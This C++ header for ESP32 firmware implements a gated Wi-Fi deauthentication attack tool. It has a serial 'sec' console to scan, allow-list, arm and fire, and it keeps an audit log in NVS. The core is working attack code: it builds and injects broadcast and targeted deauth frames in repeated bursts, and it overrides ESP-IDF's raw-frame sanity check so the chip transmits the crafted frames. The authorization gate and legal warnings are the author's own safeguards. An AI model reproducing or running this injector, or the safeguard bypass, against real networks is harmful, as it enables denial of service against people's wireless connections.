#pragma once

// Imperative shell for the ESP32 active-offense path: a gated 802.11 deauthentication
// injector plus the operator console that drives it. Compiled into every ESP32 build (like
// the Linux desktop target), it is gated entirely at RUNTIME — the radio stays silent until
// the operator arms + allow-lists a specific BSSID at the serial `sec` console.
//
// Every transmit flows through the same portable, unit-tested authorization gate the Linux
// desktop uses (core/include/zd/secops.hpp + secops_hal.hpp):
//
//   requestDeauth() -> authorize(auth, bssid) -> injector.deauth() only if Allowed
//
// The gate starts DISARMED (operatorConfirmed=false) with an EMPTY allow-list, so even with
// the feature compiled in, the radio stays silent until the operator, at the serial console,
//   1. runs `sec scan`   to discover nearby BSSIDs + channels,
//   2. runs `sec allow <bssid>`  to allow-list a specific target they are authorized to test,
//   3. runs `sec arm I-HAVE-AUTHORIZATION`  to confirm authorization, then
//   4. runs `sec deauth <bssid>` to transmit.
// There is deliberately NO wildcard / "attack-all" command and NOTHING in loop() ever
// injects: offense is strictly operator-initiated and every attempt is audit-logged (Serial
// + a durable NVS counter). Use only against networks you own or are explicitly authorized
// to assess; unauthorized deauthentication is illegal in most jurisdictions.

#include <Arduino.h>
#include <Preferences.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <cstdint>
#include <string>
#include <utility>
#include <vector>

#include "esp32_sec_cmd.hpp"
#include "zd/dot11.hpp"
#include "zd/hal.hpp"
#include "zd/secops.hpp"
#include "zd/secops_hal.hpp"

// --- ESP-IDF raw-frame sanity-check override ----------------------------------------------
//
// Current ESP-IDF rejects crafted management frames from esp_wifi_80211_tx() via an internal
// ieee80211_raw_frame_sanity_check(). Wrapping ONLY that single symbol via
// -Wl,--wrap=ieee80211_raw_frame_sanity_check (in platformio.ini) lets crafted deauth frames
// reach the PHY without globally disabling duplicate-symbol linker checks.
#ifndef ZD_ESP32_OFFENSIVE_NO_WRAP_DEF
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}
#endif

namespace zd {
namespace esp32_common {

// --- Durable audit sink (Serial + NVS monotonic counters) ---------------------------------
class SerialNvsAuditLog final : public zd::sec::IAuditLog, public IAuditCounters {
public:
    void begin() {
        ready_ = prefs_.begin("zd-sec", /*readOnly=*/false);
        if (!ready_) {
            Serial.println("[SEC-AUDIT] WARN: NVS zd-sec unavailable; DEAUTH ALLOWED will fail closed");
        }
        txTotal_ = ready_ ? prefs_.getULong("deauth_tx", 0u) : 0u;
        blkTotal_ = ready_ ? prefs_.getULong("deauth_blk", 0u) : 0u;
    }

    bool record(const std::string& line) override {
        const std::string safe = zd::sec::sanitizePrintableText(line, 200u);
        Serial.printf("[SEC-AUDIT] %s\n", safe.c_str());
        // Fail closed if NVS is unavailable for an allowed-transmission audit record.
        if (line.rfind("DEAUTH ALLOWED", 0) == 0) {
            if (!ready_) {
                Serial.println("[SEC-AUDIT] ERROR: NVS not ready; blocking unlogged DEAUTH ALLOWED");
                return false;
            }
            const unsigned long nextTx = txTotal_ + 1u;
            if (prefs_.putULong("deauth_tx", nextTx) == 0u) {
                Serial.println("[SEC-AUDIT] ERROR: NVS write failed; blocking unlogged DEAUTH ALLOWED");
                return false;
            }
            txTotal_ = nextTx;
            return true;
        }
        if (line.rfind("DEAUTH BLOCKED", 0) == 0) {
            ++blkTotal_;
            if (ready_) {
                (void)prefs_.putULong("deauth_blk", blkTotal_);
            }
        }
        return true;
    }

    unsigned long transmittedTotal() const override { return txTotal_; }
    unsigned long blockedTotal() const override { return blkTotal_; }

private:
    Preferences prefs_;
    bool ready_ = false;
    unsigned long txTotal_ = 0u;
    unsigned long blkTotal_ = 0u;
};

// --- ESP32 deauthentication injector (implements IOffensiveChannelInjector) ---------------
class Esp32Deauthenticator final : public IOffensiveChannelInjector {
public:
    bool available() const override { return true; }

    void setChannel(int channel) override {
        if (channel >= 1 && channel <= 14) {
            channel_ = channel;
        }
    }

    zd::sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                                 uint32_t count) override {
        zd::sec::InjectResult res;
        res.decision = zd::sec::AuthDecision::Allowed;  // gate already cleared by SecSession

        uint8_t ap[6];
        if (!zd::dot11::parseMac(zd::sec::normalizeMac(bssid).c_str(), ap)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        if (!zd::sec::isValidClientTarget(client)) {
            res.transmitted = false;
            res.detail = "invalid client MAC";
            return res;
        }
        uint8_t sta[6];
        const bool broadcast = client.empty() || zd::sec::isBroadcastMac(zd::sec::normalizeMac(client));
        if (broadcast) {
            for (uint8_t& b : sta) b = 0xFF;
        } else if (!zd::dot11::parseMac(zd::sec::normalizeMac(client).c_str(), sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        // Cancel any active passive async pet scan cleanly before switching to promiscuous TX.
        WiFi.scanDelete();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(static_cast<uint8_t>(channel_), WIFI_SECOND_CHAN_NONE);

        const uint32_t clamped = count > kMaxBurst ? kMaxBurst : count;
        uint8_t frame[zd::dot11::kMgmtDeauthFrameLen];
        int sent = 0;
        for (uint32_t i = 0; i < clamped; ++i) {
            // AP -> station (or broadcast): the deauth every station honors.
            const std::size_t n = zd::dot11::buildDeauthFrame(frame, sta, ap, ap);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(n), false) == ESP_OK) {
                ++sent;
            }
            // station -> AP (targeted only), mirroring aireplay-ng's bidirectional kick.
            if (!broadcast) {
                const std::size_t m = zd::dot11::buildDeauthFrame(frame, ap, sta, ap);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(m), false) == ESP_OK) {
                    ++sent;
                }
            }
            delay(1);
        }

        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);

        res.transmitted = sent > 0;
        res.detail = "esp_wifi_80211_tx deauth x" + std::to_string(sent) +
                     " ch" + std::to_string(channel_);
        return res;
    }

    static constexpr uint32_t kMaxBurst = OffensiveConsoleCore::kMaxBurst;

private:
    int channel_ = 1;
};

class Esp32OffensiveScanner final : public IOffensiveScanner {
public:
    void setPetSession(zd::hal::PlatformSession* petSession) { petSession_ = petSession; }

    std::string runScan(uint32_t nowMs, zd::sec::SecSession& secSession) override {
        WiFi.scanDelete();
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        const int16_t count = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/true);
        if (count <= 0) {
            WiFi.scanDelete();
            if (petSession_ != nullptr && petSession_->state().isScanning) {
                petSession_->dispatch(zd::ScanCompletedEvent{nowMs, {}});
            }
            return "scan: no networks found\n";
        }
        std::vector<zd::AccessPoint> petAps;
        petAps.reserve(static_cast<std::size_t>(count));
        std::string out = "scan: " + std::to_string(count) + " networks\n";
        for (int16_t i = 0; i < count; ++i) {
            const std::string bssid = zd::sec::normalizeMac(WiFi.BSSIDstr(i).c_str());
            const int32_t ch = WiFi.channel(i);
            const int32_t rssi = WiFi.RSSI(i);
            const bool enc = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
            const std::string rawSsid(WiFi.SSID(i).c_str());
            const std::string safeSsid = zd::sec::sanitizePrintableText(rawSsid, 32u);
            secSession.dispatch(zd::sec::ApObserved{
                nowMs, bssid, safeSsid, ch, rssi,
                enc ? zd::sec::Encryption::Wpa2 : zd::sec::Encryption::Open, false});
            petAps.push_back(zd::AccessPoint{rawSsid, rssi, ch, enc});
            char ln[128];
            snprintf(ln, sizeof(ln), "  %s ch%-3d %4ddBm %s %.32s\n", bssid.c_str(),
                     static_cast<int>(ch), static_cast<int>(rssi), enc ? "ENC " : "OPEN",
                     safeSsid.c_str());
            out += ln;
        }
        WiFi.scanDelete();
        if (petSession_ != nullptr) {
            petSession_->dispatch(zd::ScanCompletedEvent{nowMs, std::move(petAps)});
        }
        return out;
    }

private:
    zd::hal::PlatformSession* petSession_ = nullptr;
};

// --- Operator console (wraps pure OffensiveConsoleCore + ESP32 hardware adapters) ----------
class OffensiveConsole {
public:
    void begin() { audit_.begin(); }

    std::string handleLine(const std::string& line,
                           uint32_t nowMs,
                           zd::hal::PlatformSession* petSession = nullptr) {
        scanner_.setPetSession(petSession);
        std::string out = core_.handleLine(line, nowMs);
        scanner_.setPetSession(nullptr);
        if (petSession != nullptr && core_.isArmed() != petSession->state().offensiveArmed) {
            petSession->dispatch(zd::SetOffensiveArmedEvent{nowMs, core_.isArmed()});
        }
        return out;
    }

    bool isArmed() const { return core_.isArmed(); }
    const zd::sec::SecSession& session() const { return core_.session(); }

private:
    Esp32Deauthenticator injector_;
    SerialNvsAuditLog audit_;
    Esp32OffensiveScanner scanner_;
    OffensiveConsoleCore core_{injector_, audit_, scanner_, &audit_};
};

}  // namespace esp32_common
}  // namespace zd
